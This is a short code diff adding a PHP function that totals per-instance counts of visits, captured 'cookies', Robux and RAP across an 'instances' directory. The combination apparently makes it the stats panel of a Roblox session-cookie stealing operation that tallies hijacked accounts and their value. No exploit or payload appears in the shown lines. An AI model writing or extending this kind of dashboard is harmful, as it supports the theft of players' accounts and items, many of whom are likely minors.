@@ -187,6 +187,54 @@ function trackVisit($directory) {
 }
 
 // ============================================
+// GLOBAL STATS
+// ============================================
+
+/**
+ * Get global statistics across all instances
+ */
+function getGlobalStats() {
+    $instancesDir = __DIR__ . '/instances';
+    
+    if (!file_exists($instancesDir)) {
+        return [
+            'totalInstances' => 0,
+            'totalCookies' => 0,
+            'totalVisits' => 0,
+            'totalRobux' => 0,
+            'totalRAP' => 0
+        ];
+    }
+    
+    $totalInstances = 0;
+    $totalCookies = 0;
+    $totalVisits = 0;
+    $totalRobux = 0;
+    $totalRAP = 0;
+    
+    $directories = array_diff(scandir($instancesDir), ['.', '..', '.htaccess']);
+    
+    foreach ($directories as $dir) {
+        $path = "$instancesDir/$dir";
+        if (is_dir($path)) {
+            $totalInstances++;
+            $totalCookies += (int)(@file_get_contents("$path/cookies.txt") ?: 0);
+            $totalVisits += (int)(@file_get_contents("$path/visits.txt") ?: 0);
+            $totalRobux += (int)(@file_get_contents("$path/robux.txt") ?: 0);
+            $totalRAP += (int)(@file_get_contents("$path/rap.txt") ?: 0);
+        }
+    }
+    
+    return [
+        'totalInstances' => $totalInstances,
+        'totalCookies' => $totalCookies,
+        'totalVisits' => $totalVisits,
+        'totalRobux' => formatNumber($totalRobux),
+        'totalRAP' => formatNumber($totalRAP)
+    ];
+}
+
+// ============================================
 // RANK SYSTEM
 // ============================================
 
